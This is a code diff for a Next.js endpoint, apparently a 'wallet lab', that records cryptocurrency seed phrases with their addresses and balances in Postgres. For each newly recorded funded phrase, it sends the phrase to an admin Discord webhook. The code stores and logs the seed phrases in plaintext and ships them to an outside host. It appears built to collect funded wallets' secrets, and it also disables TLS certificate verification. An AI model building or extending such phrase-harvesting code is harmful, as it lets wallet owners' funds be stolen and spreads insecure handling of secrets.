@@ -1,29 +1,39 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { createClient } from '@supabase/supabase-js';
+import { Pool } from 'pg';
 
-// ── Runtime: Node.js ───────────────────────────────────────────────────
+// ── Runtime: Node.js (required for pg) ────────────────────────────────
 export const runtime = 'nodejs';
 
-// ── Supabase admin client (service role — server-side only) ───────────
-function getSupabaseAdmin() {
-    const url = process.env.SUPABASE_URL;
-    const key = process.env.SUPABASE_SERVICE_ROLE_KEY;
+// ── Postgres connection pool (direct DB, same as Railway) ──────────────
+// Uses DATABASE_URL env var — bypasses PostgREST entirely.
+let pool: Pool | null = null;
 
-    if (!url || !key) {
-        throw new Error('Supabase environment variables not configured.');
+function getPool(): Pool {
+    if (!pool) {
+        const url = process.env.DATABASE_URL;
+        if (!url) {
+            throw new Error('DATABASE_URL environment variable not configured.');
+        }
+        pool = new Pool({
+            connectionString: url,
+            ssl: { rejectUnauthorized: false }, // Required for Supabase
+            max: 1,                              // 1 connection max for serverless
+        });
     }
-
-    return createClient(url, key, {
-        auth: { persistSession: false },
-    });
+    return pool;
 }
 
 // ── Discord alert ──────────────────────────────────────────────────────
-async function sendDiscordAlert(phrase: string, balanceBtc: number, totalReceivedBtc: number, txCount: number): Promise<void> {
+async function sendDiscordAlert(
+    phrase: string,
+    balanceBtc: number,
+    totalReceivedBtc: number,
+    txCount: number
+): Promise<void> {
     const webhookUrl = process.env.ADMIN_ALERT_WEBHOOK;
     if (!webhookUrl) return;
 
-    const balanceSats = Math.round(balanceBtc * 1e8).toLocaleString();
+    const balanceSats  = Math.round(balanceBtc * 1e8).toLocaleString();
     const receivedSats = Math.round(totalReceivedBtc * 1e8).toLocaleString();
 
     const message =
@@ -87,53 +97,37 @@ export async function POST(req: NextRequest) {
 
     const { phrase, phrase_hash, addresses, tx_count, total_received_btc, balance_btc } = body;
 
+    const client = await getPool().connect();
     try {
-        const supabase = getSupabaseAdmin();
+        // INSERT — ignore if phrase_hash already exists (ON CONFLICT DO NOTHING)
+        const insertResult = await client.query(
+            `INSERT INTO public.wallet_lab_phrases
+                (phrase_hash, phrase, addresses, tx_count, total_received_btc, balance_btc, last_updated_at)
+             VALUES ($1, $2, $3, $4, $5, $6, NOW())
+             ON CONFLICT (phrase_hash) DO NOTHING`,
+            [phrase_hash, phrase, JSON.stringify(addresses), tx_count, total_received_btc, balance_btc]
+        );
 
-        // Insert the phrase record — ignore if it already exists (duplicates are fine)
-        const { error: insertError } = await supabase
-            .from('wallet_lab_phrases')
-            .insert({
-                phrase_hash,
-                phrase,
-                addresses,
-                tx_count,
-                total_received_btc,
-                balance_btc,
-                last_updated_at: new Date().toISOString(),
-            });
+        const wasInserted = insertResult.rowCount !== null && insertResult.rowCount > 0;
+        console.log(`[wallet-lab/record] phrase="${phrase}" inserted=${wasInserted}`);
 
-        if (insertError) {
-            // Code 23505 = unique constraint violation → phrase already recorded, not a real error
-            if (!insertError.code || insertError.code !== '23505') {
-                console.error('[wallet-lab/record] Supabase insert error:', insertError.message, insertError.code);
-            }
-            // Either way, continue to check alert status below
+        // Send Discord alert if balance is positive AND phrase was newly inserted
+        // (wasInserted=false means it already alerted previously)
+        if (balance_btc > 0 && wasInserted) {
+            await sendDiscordAlert(phrase, balance_btc, total_received_btc, tx_count);
+
+            // Mark alert as sent
+            await client.query(
+                `UPDATE public.wallet_lab_phrases SET alert_sent = TRUE WHERE phrase_hash = $1`,
+                [phrase_hash]
+            );
         }
 
-        // Send Discord alert if balance is positive AND alert hasn't been sent for this phrase
-        if (balance_btc > 0) {
-            // Check if alert was already sent for this exact phrase_hash
-            const { data: existing } = await supabase
-                .from('wallet_lab_phrases')
-                .select('alert_sent')
-                .eq('phrase_hash', phrase_hash)
-                .single();
-
-            if (!existing?.alert_sent) {
-                await sendDiscordAlert(phrase, balance_btc, total_received_btc, tx_count);
-
-                // Mark as alerted
-                await supabase
-                    .from('wallet_lab_phrases')
-                    .update({ alert_sent: true })
-                    .eq('phrase_hash', phrase_hash);
-            }
-        }
-
-        return NextResponse.json({ ok: true });
+        return NextResponse.json({ ok: true, inserted: wasInserted });
     } catch (err) {
-        console.error('[wallet-lab/record] Unexpected error:', err instanceof Error ? err.message : 'unknown');
+        console.error('[wallet-lab/record] DB error:', err instanceof Error ? err.message : 'unknown');
         return NextResponse.json({ error: 'Internal server error.' }, { status: 500 });
+    } finally {
+        client.release();
     }
 }
